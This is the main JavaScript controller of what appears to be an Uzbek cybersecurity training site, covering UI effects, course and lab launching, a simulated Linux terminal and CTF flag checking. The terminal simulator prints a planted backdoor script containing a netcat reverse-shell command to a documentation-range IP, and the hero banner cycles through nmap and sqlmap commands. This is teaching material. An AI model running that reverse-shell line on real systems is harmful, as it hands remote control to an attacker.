/**
 * CYBERTRIP.UZ — Platform Main Interactive Controller
 * O'zbekiston kiberxavfsizlik ta'lim platformasi va kiber-poligoni
 */

document.addEventListener('DOMContentLoaded', () => {
    
    // ==========================================
    // 0. Preloader Dismissal & AOS Init
    // ==========================================
    const preloader = document.getElementById('preloader');
    if (preloader) {
        preloader.style.transition = 'opacity 0.3s ease';
        preloader.style.opacity = '0';
        preloader.style.pointerEvents = 'none';
        setTimeout(() => {
            preloader.style.display = 'none';
        }, 300);
    }

    if (typeof AOS !== 'undefined') {
        AOS.init({ once: true, duration: 600, offset: 30 });
    }

    // ==========================================
    // 1. Navigation & Scroll Effects
    // ==========================================
    const navbar = document.getElementById('navbar') || document.querySelector('.navbar');
    const mobileMenuToggle = document.getElementById('hamburger');
    const navLinks = document.getElementById('navMenu');
    const links = document.querySelectorAll('.nav-link');
    const sections = document.querySelectorAll('section');

    // Sticky Navbar
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            navbar?.classList.add('scrolled');
        } else {
            navbar?.classList.remove('scrolled');
        }
    });

    // Mobile Menu Toggle
    if (mobileMenuToggle && navLinks) {
        mobileMenuToggle.addEventListener('click', () => {
            navLinks.classList.toggle('active');
            mobileMenuToggle.classList.toggle('active');
        });
    }

    // Smooth Scroll & Close Menu on Click
    links.forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute('href');
            if (href && href.startsWith('#')) {
                e.preventDefault();
                const targetSection = document.querySelector(href);
                if (targetSection) {
                    window.scrollTo({
                        top: targetSection.offsetTop - 70,
                        behavior: 'smooth'
                    });
                }
                navLinks?.classList.remove('active');
                mobileMenuToggle?.classList.remove('active');
            }
        });
    });

    // Active Link Highlighting
    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach(section => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (window.pageYOffset >= (sectionTop - sectionHeight / 3)) {
                current = section.getAttribute('id') || '';
            }
        });

        links.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === `#${current}`) {
                link.classList.add('active');
            }
        });
    });

    // ==========================================
    // 2. Animated Counter (Statistikalar)
    // ==========================================
    const counters = document.querySelectorAll('.stat-number');
    const speed = 150;

    const startCounter = (counter) => {
        const target = +counter.getAttribute('data-count') || 0;
        let count = 0;
        const inc = Math.max(1, Math.ceil(target / speed));

        const updateCount = () => {
            count += inc;
            if (count < target) {
                counter.innerText = count.toLocaleString('uz-UZ');
                setTimeout(updateCount, 15);
            } else {
                counter.innerText = target.toLocaleString('uz-UZ');
            }
        };
        updateCount();
    };

    const counterObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                startCounter(entry.target);
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.2 });

    counters.forEach(counter => counterObserver.observe(counter));

    // ==========================================
    // 3. Course Filtering
    // ==========================================
    const filterBtns = document.querySelectorAll('.filter-btn');
    const courseCards = document.querySelectorAll('.course-card');

    if (filterBtns.length > 0 && courseCards.length > 0) {
        filterBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                filterBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');

                const filterValue = btn.getAttribute('data-filter');

                courseCards.forEach(card => {
                    const cat = card.getAttribute('data-category');
                    if (filterValue === 'all' || cat === filterValue) {
                        card.style.display = 'flex';
                        card.style.opacity = '1';
                        card.style.transform = 'scale(1)';
                    } else {
                        card.style.opacity = '0';
                        card.style.transform = 'scale(0.95)';
                        setTimeout(() => {
                            if (btn.getAttribute('data-filter') !== 'all' && card.getAttribute('data-category') !== filterValue) {
                                card.style.display = 'none';
                            }
                        }, 200);
                    }
                });
            });
        });
    }

    // ==========================================
    // 4. FAQ Accordion
    // ==========================================
    const faqItems = document.querySelectorAll('.faq-item');

    faqItems.forEach(item => {
        const questionBtn = item.querySelector('.faq-question');
        questionBtn?.addEventListener('click', () => {
            const isActive = item.classList.contains('active');
            
            // Close other items
            faqItems.forEach(faq => {
                faq.classList.remove('active');
                const ans = faq.querySelector('.faq-answer');
                if (ans) ans.style.maxHeight = null;
            });

            // Toggle clicked
            if (!isActive) {
                item.classList.add('active');
                const ans = item.querySelector('.faq-answer');
                if (ans) {
                    ans.style.maxHeight = ans.scrollHeight + "px";
                }
            }
        });
    });

    // ==========================================
    // 5. Testimonial Slider
    // ==========================================
    const track = document.getElementById('testimonialTrack');
    const prevBtn = document.getElementById('testimonialPrev');
    const nextBtn = document.getElementById('testimonialNext');
    const dotsContainer = document.getElementById('testimonialDots');
    const cards = track ? track.querySelectorAll('.testimonial-card') : [];
    
    let currentIdx = 0;
    let autoSlideTimer;

    if (track && cards.length > 0) {
        // Create dot indicators
        cards.forEach((_, i) => {
            const dot = document.createElement('div');
            dot.className = `slider-dot ${i === 0 ? 'active' : ''}`;
            dot.addEventListener('click', () => goToSlide(i));
            dotsContainer?.appendChild(dot);
        });

        const dots = dotsContainer?.querySelectorAll('.slider-dot') || [];

        function goToSlide(idx) {
            currentIdx = (idx + cards.length) % cards.length;
            cards.forEach((c, i) => {
                c.style.display = i === currentIdx ? 'block' : 'none';
            });
            dots.forEach((d, i) => d.classList.toggle('active', i === currentIdx));
        }

        goToSlide(0);

        nextBtn?.addEventListener('click', () => goToSlide(currentIdx + 1));
        prevBtn?.addEventListener('click', () => goToSlide(currentIdx - 1));

        autoSlideTimer = setInterval(() => goToSlide(currentIdx + 1), 6000);
        track.addEventListener('mouseenter', () => clearInterval(autoSlideTimer));
        track.addEventListener('mouseleave', () => {
            autoSlideTimer = setInterval(() => goToSlide(currentIdx + 1), 6000);
        });
    }

    // ==========================================
    // 6. Particle Canvas Network
    // ==========================================
    const canvas = document.getElementById('particleCanvas');
    if (canvas) {
        const ctx = canvas.getContext('2d');
        let particles = [];

        function resizeCanvas() {
            canvas.width = canvas.parentElement ? canvas.parentElement.offsetWidth : window.innerWidth;
            canvas.height = canvas.parentElement ? canvas.parentElement.offsetHeight : window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        let mouse = { x: null, y: null, radius: 100 };
        window.addEventListener('mousemove', (e) => {
            const rect = canvas.getBoundingClientRect();
            mouse.x = e.clientX - rect.left;
            mouse.y = e.clientY - rect.top;
        });
        window.addEventListener('mouseleave', () => { mouse.x = null; mouse.y = null; });

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 1.2;
                this.vy = (Math.random() - 0.5) * 1.2;
                this.radius = Math.random() * 2 + 1;
            }
            update() {
                this.x += this.vx;
                this.y += this.vy;
                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;

                if (mouse.x !== null) {
                    const dx = mouse.x - this.x;
                    const dy = mouse.y - this.y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < mouse.radius) {
                        this.x -= (dx / dist) * 2;
                        this.y -= (dy / dist) * 2;
                    }
                }
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                ctx.fillStyle = '#00d4ff';
                ctx.fill();
            }
        }

        const particleCount = Math.min(60, Math.floor(window.innerWidth / 20));
        for (let i = 0; i < particleCount; i++) particles.push(new Particle());

        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let i = 0; i < particles.length; i++) {
                particles[i].update();
                particles[i].draw();

                for (let j = i + 1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < 120) {
                        ctx.beginPath();
                        ctx.strokeStyle = `rgba(0, 212, 255, ${0.2 * (1 - dist / 120)})`;
                        ctx.lineWidth = 0.8;
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(animateParticles);
        }
        animateParticles();
    }

    // ==========================================
    // 7. Hero Terminal Live Typing Simulation
    // ==========================================
    const termCmdEl = document.getElementById('terminalCommand');
    if (termCmdEl) {
        const commands = [
            'nmap -sV -sC -T4 target.lab.cybertrip.uz',
            'sqlmap -u "http://cyberbooks.lab/books?q=test" --dbs',
            'curl -i -s http://target.lab/api/v1/auth/token',
            'dirb http://diagnostic.lab/ /usr/share/wordlists/dirb/common.txt'
        ];
        let cIdx = 0, charI = 0, isDeleting = false;

        function stepTerminalType() {
            const current = commands[cIdx];
            if (!isDeleting) {
                termCmdEl.textContent = current.slice(0, charI + 1);
                charI++;
                if (charI === current.length) {
                    isDeleting = true;
                    setTimeout(stepTerminalType, 2500);
                    return;
                }
            } else {
                termCmdEl.textContent = current.slice(0, charI - 1);
                charI--;
                if (charI === 0) {
                    isDeleting = false;
                    cIdx = (cIdx + 1) % commands.length;
                    setTimeout(stepTerminalType, 600);
                    return;
                }
            }
            setTimeout(stepTerminalType, isDeleting ? 30 : 65);
        }
        stepTerminalType();
    }

    // ==========================================
    // 8. Hero Typewriter Text
    // ==========================================
    const typingTextEl = document.getElementById('typingText');
    if (typingTextEl) {
        const terms = [
            'Web Penetration Testing',
            'Ethical Hacking & Red Team',
            'SOC Analyst & Blue Team',
            'Bug Bounty Hunting (OWASP Top 10)',
            'Malware Analysis & Digital Forensics',
            'In-Browser Linux Terminal & Labs'
        ];
        let tIdx = 0, tChar = 0, deleting = false;

        function runTypewriter() {
            const word = terms[tIdx];
            if (!deleting) {
                typingTextEl.textContent = word.slice(0, tChar + 1);
                tChar++;
                if (tChar === word.length) {
                    deleting = true;
                    setTimeout(runTypewriter, 2000);
                    return;
                }
            } else {
                typingTextEl.textContent = word.slice(0, tChar - 1);
                tChar--;
                if (tChar === 0) {
                    deleting = false;
                    tIdx = (tIdx + 1) % terms.length;
                    setTimeout(runTypewriter, 500);
                    return;
                }
            }
            setTimeout(runTypewriter, deleting ? 35 : 75);
        }
        runTypewriter();
    }

    // ==========================================
    // 9. Modals (Login & Register)
    // ==========================================
    const loginModal = document.getElementById('loginModal');
    const registerModal = document.getElementById('registerModal');
    const loginBtn = document.getElementById('loginBtn');
    const registerBtn = document.getElementById('registerBtn');
    const ctaRegisterBtn = document.getElementById('ctaRegisterBtn');
    const loginClose = document.getElementById('loginModalClose');
    const registerClose = document.getElementById('registerModalClose');
    const switchToRegister = document.querySelector('.switch-to-register');
    const switchToLogin = document.querySelector('.switch-to-login');
    const notificationToast = document.getElementById('notification');
    const notificationText = document.getElementById('notificationText');

    function showToast(msg) {
        if (!notificationToast) return;
        if (notificationText) notificationText.textContent = msg;
        notificationToast.classList.add('show');
        setTimeout(() => notificationToast.classList.remove('show'), 4000);
    }

    function openModal(m) {
        if (!m) return;
        m.style.display = 'flex';
        m.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    function closeModal(m) {
        if (!m) return;
        m.classList.remove('active');
        setTimeout(() => { m.style.display = 'none'; }, 200);
        document.body.style.overflow = '';
    }

    loginBtn?.addEventListener('click', () => openModal(loginModal));
    registerBtn?.addEventListener('click', () => openModal(registerModal));
    ctaRegisterBtn?.addEventListener('click', () => openModal(registerModal));

    loginClose?.addEventListener('click', () => closeModal(loginModal));
    registerClose?.addEventListener('click', () => closeModal(registerModal));

    switchToRegister?.addEventListener('click', (e) => {
        e.preventDefault();
        closeModal(loginModal);
        openModal(registerModal);
    });

    switchToLogin?.addEventListener('click', (e) => {
        e.preventDefault();
        closeModal(registerModal);
        openModal(loginModal);
    });

    [loginModal, registerModal].forEach(m => {
        m?.addEventListener('click', (e) => {
            if (e.target === m) closeModal(m);
        });
    });

    // Form handlers
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');

    loginForm?.addEventListener('submit', (e) => {
        e.preventDefault();
        showToast("Tizimga muvaffaqiyatli kirdingiz! Xush kelibsiz.");
        closeModal(loginModal);
    });

    registerForm?.addEventListener('submit', (e) => {
        e.preventDefault();
        showToast("Ro'yxatdan muvaffaqiyatli o'tdingiz! +100 XP berildi.");
        closeModal(registerModal);
    });

    // Password strength
    const regPass = document.getElementById('registerPassword');
    const strengthFill = document.querySelector('.strength-fill');
    const strengthText = document.querySelector('.strength-text');

    regPass?.addEventListener('input', (e) => {
        const val = e.target.value;
        let score = 0;
        if (val.length >= 8) score++;
        if (/[A-Z]/.test(val)) score++;
        if (/[0-9]/.test(val)) score++;
        if (/[^A-Za-z0-9]/.test(val)) score++;

        if (!strengthFill || !strengthText) return;
        if (val.length === 0) {
            strengthFill.style.width = '0%';
            strengthText.textContent = "Parol kuchini kiriting";
        } else if (score <= 1) {
            strengthFill.style.width = '25%';
            strengthFill.style.background = '#ef4444';
            strengthText.textContent = "Zaif parol";
        } else if (score <= 3) {
            strengthFill.style.width = '65%';
            strengthFill.style.background = '#f59e0b';
            strengthText.textContent = "O'rtacha parol";
        } else {
            strengthFill.style.width = '100%';
            strengthFill.style.background = '#10b981';
            strengthText.textContent = "Kuchli parol";
        }
    });

    // ==========================================
    // 10. Back To Top
    // ==========================================
    const backToTop = document.getElementById('backToTop');
    if (backToTop) {
        window.addEventListener('scroll', () => {
            if (window.scrollY > 400) {
                backToTop.classList.add('visible');
            } else {
                backToTop.classList.remove('visible');
            }
        });
        backToTop.addEventListener('click', () => {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    }

    // ==========================================
    // 11. Theme Toggle
    // ==========================================
    const themeToggle = document.getElementById('themeToggle');
    themeToggle?.addEventListener('click', () => {
        showToast("Cybertrip kiberxavfsizlik mavzusi (Dark Hacker Mode) optimal hisoblanadi.");
    });

    // ==========================================
    // 12. Interactive Lab Launching from Course Cards
    // ==========================================
    const enrollButtons = document.querySelectorAll('.course-enroll');
    const labTargetsMap = {
        0: { name: 'CyberBooks (SQL Injection)', url: 'targets/cyberbooks/index.html' },
        1: { name: 'CyberForum (Web XSS Security)', url: 'targets/cyberforum/index.html' },
        2: { name: 'DiagnosticPanel (Command Injection)', url: 'targets/diagnosticpanel/index.html' },
        3: { name: 'SecureDocs (IDOR / BOLA)', url: 'targets/securedocs/index.html' },
        4: { name: 'DiagnosticPanel (Network Security)', url: 'targets/diagnosticpanel/index.html' },
        5: { name: 'SitePreview (SSRF & Cloud)', url: 'targets/sitepreview/index.html' },
        6: { name: 'MediaVault (File Upload / Malware)', url: 'targets/mediavault/index.html' },
        7: { name: 'SitePreview (Cloud & DevSecOps)', url: 'targets/sitepreview/index.html' },
        8: { name: 'CyberBooks (CTF & Challenges)', url: 'targets/cyberbooks/index.html' }
    };

    enrollButtons.forEach((btn, idx) => {
        btn.innerHTML = `<i class="fas fa-play-circle"></i> Labni Boshlash`;
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            const target = labTargetsMap[idx] || labTargetsMap[0];
            openLabRunner(target.name, target.url);
        });
    });

    // Fullscreen Lab Runner Modal
    function openLabRunner(name, url) {
        let runner = document.getElementById('cyberLabRunner');
        if (!runner) {
            runner = document.createElement('div');
            runner.id = 'cyberLabRunner';
            runner.style.cssText = `
                position: fixed; inset: 0; z-index: 100000; background: rgba(5, 7, 12, 0.95);
                backdrop-filter: blur(8px); display: flex; flex-direction: column;
            `;
            runner.innerHTML = `
                <div style="height: 52px; background: #0b0f17; border-bottom: 1px solid #1f293d; display: flex; align-items: center; justify-content: space-between; padding: 0 1.5rem; flex-shrink: 0;">
                    <div style="display: flex; align-items: center; gap: 0.75rem;">
                        <span style="font-weight: 700; color: #00d4ff; font-family: 'Orbitron', sans-serif; font-size: 0.95rem;">
                            🛡️ CYBERTRIP LAB RUNNER
                        </span>
                        <span style="color: #64748b;">|</span>
                        <span id="runnerLabTitle" style="color: #f1f5f9; font-weight: 600; font-size: 0.85rem;"></span>
                        <span style="background: rgba(0, 255, 136, 0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.3); font-size: 0.7rem; font-weight: 700; padding: 0.15rem 0.5rem; border-radius: 4px;">RUNNING</span>
                    </div>
                    <div style="display: flex; align-items: center; gap: 1rem;">
                        <a id="runnerExternalLink" href="#" target="_blank" style="color: #00d4ff; font-size: 0.8rem; text-decoration: none; display: flex; align-items: center; gap: 0.3rem;">
                            <i class="fas fa-external-link-alt"></i> Yangi oynada
                        </a>
                        <button id="runnerCloseBtn" style="background: #ef4444; color: #fff; border: none; padding: 0.35rem 0.75rem; border-radius: 6px; font-size: 0.8rem; font-weight: 600; cursor: pointer;">
                            Yopish ✕
                        </button>
                    </div>
                </div>
                <div style="flex: 1; position: relative;">
                    <iframe id="runnerIframe" style="width: 100%; height: 100%; border: none; background: #fff;" sandbox="allow-scripts allow-forms allow-same-origin allow-modals"></iframe>
                </div>
            `;
            document.body.appendChild(runner);

            document.getElementById('runnerCloseBtn').addEventListener('click', () => {
                runner.style.display = 'none';
                document.getElementById('runnerIframe').src = '';
                document.body.style.overflow = '';
            });
        }

        document.getElementById('runnerLabTitle').textContent = name;
        document.getElementById('runnerExternalLink').href = url;
        document.getElementById('runnerIframe').src = url;
        runner.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        showToast(`🎯 Laboratoriya ishga tushirildi: ${name}`);
    }

    // Expose openLabRunner globally
    window.openLabRunner = openLabRunner;

    // ==========================================
    // 13. Inline Linux Terminal Simulator
    // ==========================================
    let inlineTasks = [false, false, false];
    window.handleInlineTerminalSubmit = function(e) {
        e.preventDefault();
        const input = document.getElementById('inlineTermInput');
        const log = document.getElementById('inlineTermLog');
        const cmd = input.value.trim();
        if (!cmd) return;

        input.value = '';
        log.textContent += `student@cybertrip:~$ ${cmd}\n`;

        const lower = cmd.toLowerCase();
        let out = '';

        if (lower === 'clear') {
            log.textContent = '';
            return;
        } else if (lower === 'help') {
            out = 'Buyruqlar: whoami, id, uname -a, ls -la /tmp, cat [fayl], pwd, ps, clear, help\n';
        } else if (lower === 'whoami') {
            out = 'student\n';
            inlineTasks[0] = true;
        } else if (lower === 'id') {
            out = 'uid=1000(student) gid=1000(student) groups=1000(student),27(sudo)\n';
            inlineTasks[0] = true;
        } else if (lower.startsWith('uname')) {
            out = 'Linux cybertrip-sandbox 6.8.0-31-generic #31-Ubuntu x86_64 GNU/Linux\n';
            inlineTasks[0] = true;
        } else if (lower.includes('ls') && lower.includes('/tmp')) {
            out = 'drwxrwxrwt 2 root root 4096 Sep 27 12:00 .\ndrwxr-xr-x 4 root root 4096 Sep 27 10:00 ..\n-rwxr-xr-x 1 www-data www-data 154 Sep 27 11:40 .suspicious_backdoor.sh\n';
            inlineTasks[1] = true;
        } else if (lower.includes('cat') && lower.includes('.suspicious_backdoor.sh')) {
            out = '#!/bin/bash\n# Reverse shell backdoor\nnc -e /bin/bash 198.51.100.24 4444 &\n# FLAG{susp1c10us_h1dd3n_sh3ll_f0und}\n';
            inlineTasks[2] = true;
            showToast("🎉 Tabriklaymiz! Yashirin backdoor flagi topildi!");
        } else if (lower === 'ls' || lower === 'ls -la') {
            out = '-rw-r--r-- 1 student student  240 Sep 27 11:30 notes.txt\n-rw-r--r-- 1 student student 1024 Sep 27 11:45 incident_report.md\n';
        } else if (lower === 'pwd') {
            out = '/home/student\n';
        } else if (lower === 'ps' || lower === 'ps aux') {
            out = 'PID TTY TIME CMD\n  1 ?   00:02 init\n482 ?   00:00 sshd\n890 ?   00:01 nc -l 4444\n';
        } else {
            out = `bash: ${cmd.split(' ')[0]}: buyruq topilmadi. Yordam uchun 'help' deb yozing.\n`;
        }

        log.textContent += out + '\n';
        log.scrollTop = log.scrollHeight;

        // Update task indicators
        const completed = inlineTasks.filter(Boolean).length;
        const counter = document.getElementById('termTaskCounter');
        if (counter) counter.textContent = `${completed} / 3`;

        ['termTask1', 'termTask2', 'termTask3'].forEach((id, i) => {
            const el = document.getElementById(id);
            if (el && inlineTasks[i]) {
                el.style.border = '1px solid #10b981';
                el.style.background = 'rgba(16, 185, 129, 0.15)';
                el.querySelector('div').style.color = '#34d399';
            }
        });
    };

    // ==========================================
    // 14. CTF Flag Validation Engine
    // ==========================================
    let ctfScore = 0;
    let ctfSolved = 0;
    const solvedSet = new Set();

    window.checkCTFFlag = function(id, expectedFlag, points) {
        if (solvedSet.has(id)) {
            showToast("⚠️ Bu topshiriqni allaqachon topshirgansiz!");
            return;
        }

        const input = document.getElementById(`flagInput${id}`);
        const userFlag = input ? input.value.trim() : '';

        if (!userFlag) {
            showToast("❌ Iltimos, avval topilgan flagni kiriting!");
            return;
        }

        if (userFlag === expectedFlag) {
            solvedSet.add(id);
            ctfScore += points;
            ctfSolved += 1;

            const scoreEl = document.getElementById('ctfTotalScore');
            const solvedEl = document.getElementById('ctfSolvedCounter');
            if (scoreEl) scoreEl.textContent = `${ctfScore} ball`;
            if (solvedEl) solvedEl.textContent = `${ctfSolved} / 4 ta`;

            input.disabled = true;
            input.style.border = '1px solid #10b981';
            input.style.color = '#34d399';

            showToast(`🚩 AJOYIB! To'g'ri Flag! +${points} ball qo'shildi.`);
        } else {
            showToast("❌ Noto'g'ri Flag! Qayta urinib ko'ring yoki laboratoriyani tekshiring.");
        }
    };

    // Hero buttons hooks
    const heroExploreBtn = document.querySelector('.hero-buttons a[href="#courses"]');
    if (heroExploreBtn) {
        heroExploreBtn.innerHTML = `<i class="fas fa-flask"></i> Laboratoriyalar & Cyber Range`;
    }
});
